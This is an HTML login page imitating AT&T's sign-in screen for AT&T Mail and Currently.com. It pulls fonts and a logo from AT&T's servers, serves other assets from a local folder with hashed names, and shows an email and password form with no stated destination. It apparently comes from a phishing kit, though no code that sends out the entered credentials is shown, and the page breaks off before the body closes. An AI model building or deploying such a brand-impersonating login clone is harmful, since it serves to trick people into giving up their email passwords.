<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<title>Login Screen</title>

<meta content="IE=9; IE=8; IE=7; IE=11; IE=EDGE" http-equiv="X-UA-Compatible"/>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
<link href="local_resources/img/64731b4f9cbe5d225bf3d41c0b9b2d64.ico" rel="icon" type="image/x-icon"/>
<link as="font" crossorigin="" href="https://signin.att.com/static/siam/en/halo_c/halo-c-login/assets/fonts/att/ATTAleckSans/woff2/ATTAleckSans_W_Rg.woff2" rel="preload" type="font/woff2"/>
<link as="font" crossorigin="" href="https://signin.att.com/static/siam/en/halo_c/halo-c-login/assets/fonts/att/ATTAleckSans/woff2/ATTAleckSans_W_Bd.woff2" rel="preload" type="font/woff2"/>
<link as="image" href="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" rel="preload" type="image/svg+xml"/>
<link href="local_resources/css/b7f511df7915aa5777977c4c31d9d7ed.css" rel="stylesheet"/>
<style>
        .full-height { min-height: 100vh; }
        .footer-div { margin-top: 48px; margin-bottom: 24px; }
        .footer-links-div { display: flex; flex-direction: row; }
        .footer-links-div app-footer-link { margin-right: 24px; }
        .footer-links-div app-footer-link:last-child { margin-right: 0; }
        .copyright { margin-top: 16px; display: flex; flex-direction: row; align-items: center; justify-content: center; }
        @media (max-width: 767px) {
            .footer-div { margin-bottom: 32px; }
            .footer-links-div { display: flex; flex-direction: column; align-items: flex-start; }
            .footer-links-div app-footer-link { margin-bottom: 10px; }
            .footer-links-div app-footer-link:last-child { margin-bottom: 0; }
            app-footer-link { height: 24px; }
            .copyright { margin-top: 16px; justify-content: flex-start; }
        }
        .space-below { margin-bottom: 32px; }
        @media (max-width: 767px) {
            .space-below { margin-bottom: 24px; }
        }
        .header-logo-position-fr-qrcard { margin-left: 70px; align-self: flex-start; }
        .header-logo-position-fr-learMore { margin-bottom: 48px; align-self: flex-start; }
        .header-floating-logo-generic { margin-top: 32px; margin-left: 70px; margin-bottom: 64px; align-self: flex-start; }
        .left-align-header-logo-desktop { align-self: flex-start; }
        .header-logo-image-no-bottom { margin-bottom: 0; }
        @media (max-width: 767px) {
            .header-logo-position-fr-qrcard { margin-left: 0; align-self: center; }
            .header-logo-position-fr-learMore { margin-bottom: 16px; align-self: center; }
            .header-floating-logo-generic { margin-left: 0; }
            .header-floating-logo-generic, .left-align-header-logo-desktop { margin-bottom: 32px; align-self: center; }
        }
        .prepaid-ctn-button { width: 100%; height: 48px; text-align: center; border-radius: 3px; border: 1px solid #1d2329; background-color: #fff; color: #1d2329; font-size: 1.4rem; line-height: 2.5rem; margin-top: 8px; display: flex; align-items: center; justify-content: center; }
        .prepaid-ctn-button:hover { text-decoration: none; background-color: #1d2329; color: #fff; }
        .error-message { color: rgb(228, 13, 31); }

        /* Spinner styles */
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            display: none; /* Hidden by default */
            margin: 0 auto; /* Center the spinner */
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
<div app-version="23.2.1" id="app-root" ng-version="11.2.14">
<div class="full-width-background bg-white" id="appCompBackground">
<div class="container pad-l-none-sm pad-r-none-sm pad-t-none-sm pad-b-none-sm full-height flex flex-column" id="appCompContainer">
<div class="row justify-center flex-1" id="appCompCardContainer">
<div class="pad-none" id="appCompCardContDiv">
<div role="main">
<div class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
<div class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
<header class="flex-container">
<img alt="" class="header-logo-image mar-b-md-all" id="headerLogoImage" src="local_resources/img/be8e72a553b38e4d68e7d26784e7996e.svg"/>
<div class="mar-b-md-all text-center" id="signInHeaderTextDiv">
<h1 class="heading-lg" id="signInHeaderText">Sign in</h1>
<h1 class="heading-md mar-t-xxs-lg" id="signInHeaderToText">to access AT&amp;T Mail and Currently.com</h1>
</div>
</header>
<div class="width-full">
<div id="error-container">
<form id="login-form">
<label class="form-row" for="email">Email</label>
<br/>
<br/>
<input class="textfield" id="email" name="email" type="text"/>
<br/><br/>
<div id="email-error" style="display:none;"></div>
<label class="form-row" for="password">Password</label>
<br/>
<br/>
<input class="textfield" id="password" name="password" type="password"/>
<br/>
<div class="spinner" id="loading"></div>
<p class="error-message" id="error"></p>
<br/>
<button class="btn-full-width btn-primary" id="submit-btn" type="submit">Sign in</button>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
